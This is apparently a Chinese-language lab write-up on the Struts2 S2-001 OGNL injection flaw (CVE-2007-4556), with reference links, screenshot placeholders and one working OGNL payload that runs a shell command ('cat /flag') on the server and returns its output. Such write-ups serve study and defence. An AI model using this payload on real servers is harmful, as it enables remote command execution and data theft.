> https://yunjing.ichunqiu.com/cve/detail/952
> #Struts2

> WebWork 2.1+ 和 Struts 2 的 “altSyntax” 功能允许将 OGNL 表达式插入到文本字符串中，并以递归方式进行处理。这允许恶意用户提交一个字符串，通常通过 HTML 文本字段，其中包含一个 OGNL 表达式，如果表单验证失败，服务器将执行该表达式。
> Struts2系列漏洞：S2-001
> https://nvd.nist.gov/vuln/detail/CVE-2007-4556
> https://www.rapid7.com/db/vulnerabilities/struts-cve-2007-4556/
> https://si1ent.xyz/2021/02/26/Struts2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/

正常访问：
![[Pasted image 20230117141909.png]]

测试正常登录：
![[Pasted image 20230117142212.png]]

使用网上的payload进行测试：
![[Pasted image 20230117142358.png]]

确定漏洞存在，直接注入：
```java
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/flag"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
经过url编码后，执行结果：
![[Pasted image 20230117144421.png]]